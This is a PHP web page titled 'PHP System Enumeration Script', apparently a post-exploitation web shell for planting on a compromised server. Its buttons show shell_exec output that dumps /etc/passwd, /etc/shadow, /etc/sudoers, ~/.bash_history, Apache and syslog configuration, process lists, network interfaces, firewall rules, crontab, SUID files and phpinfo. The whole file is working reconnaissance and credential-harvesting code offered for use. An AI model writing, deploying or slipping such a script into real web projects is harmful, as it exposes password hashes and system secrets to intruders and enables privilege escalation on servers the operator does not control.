<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title></title>
    <script>
    function myFunction(elm) {
      var x = document.getElementById(elm);
      if (x.style.display === "none") {
        x.style.display = "block";
      } else {
        x.style.display = "none";
      }
    }
    </script>


<!-- <center> -->
</head>
<body>
  <center>
    <h1 style="font-family: Monospace;">PHP SYSTEM ENUMERATION SCRIPT</h1>
    <?php
        echo " ".php_uname();
        echo '<br>Current User: ' . get_current_user();
    ?>
    <br>
    <br>
    <button onclick="javascript:myFunction('sysinfo')">SYS INFO</button>  <button onclick="javascript:myFunction('usersinfo')">USERS INFO</button> <button onclick="javascript:myFunction('netinfo')">NETWORK INFO</button> <button onclick="javascript:myFunction('appinfo')">APP INFO</button>  <button onclick="javascript:myFunction('suidfiles')">SUID/GUID FILES</button> <button onclick="javascript:myFunction('phpinfo')">SHOW PHPINFO</button>
    <br>

  </center>
<hr>
<pre>
<div id="sysinfo" style="display: none;">
<?php


    echo "PHP_OS Var: ".strtoupper(substr(PHP_OS, 0, 3));
    echo "<br>uid: ".getmyuid();
    echo "<br>gid: ".getmygid();
    echo "<br>pid: ".getmypid();
    echo "<br>inode: ".getmyinode();
    echo "<br>lastmod: ".getlastmod();
    echo "<br>";
    echo "<br><b>PROCESS LIST</b><br>";
    echo shell_exec("ps -fea");
    echo "cat syslog";
    echo shell_exec('cat /etc/syslog.conf');
    echo "cat inetd";
    echo shell_exec('cat /etc/inetd.conf');

?>
</div>

<div id="appinfo" style="display: none;">
<?php
/*
apache, php, ...
*/
    echo "<br>";
    $sapi_type = php_sapi_name();
    if (substr($sapi_type, 0, 3) == 'cgi') {
        echo "Está usando PHP CGI\n";
    } else {
        echo "No está usando PHP CGI\n";
    }
    echo "<br>";
    $version = apache_get_version();
    echo "$version\n";
    echo "CAT APACHE CONF";
    echo shell_exec('cat /etc/apache2/apache2.conf');
    echo "CAT HTTPD CONF";
    echo "CAT lighttpf CONF";
    echo "CAT cupsd CONF";

?>
</div>
<div id="usersinfo" style="display: none;">
<?php
  // USERS INFORMATION
    echo "<br> /etc/passwd: <br>";
    echo shell_exec("cat /etc/passwd");
    echo "<br> /etc/shadow: <br>";
    echo shell_exec("cat /etc/shadow");
    echo "<br> /etc/group: <br>";
    echo shell_exec("cat /etc/group");
    echo "<br>SUDOERS FILE<br>";
    echo shell_exec("cat /etc/sudoers");
    echo "<br> ~/.bash_history: <br>";
    echo shell_exec("cat ~/.bash_history");
?>
</div>
<div id="netinfo" style="display: none;">
<?php
// NETWORK INFORMATION
    echo "<br> <br>";
    echo "<br>infoncig <br>";
    echo shell_exec("/sbin/ifconfig -a");
    echo "<br>iptables <br>";
    echo shell_exec("iptables -L");
    echo "<br>crontab <br>";
    echo shell_exec("crontab -l");

// find /etc/ -readable -type f -maxdepth 1 2>/dev/null
?>
</div>
<div id="suidfiles" style="display: none;">

<?php echo shell_exec("find / -perm -u=s -type f 2>/dev/null") ?>

</div>
<div id="phpinfo" style="display: none;">
  <?php phpinfo(); ?>
</div>
</pre>
</body>
</html>
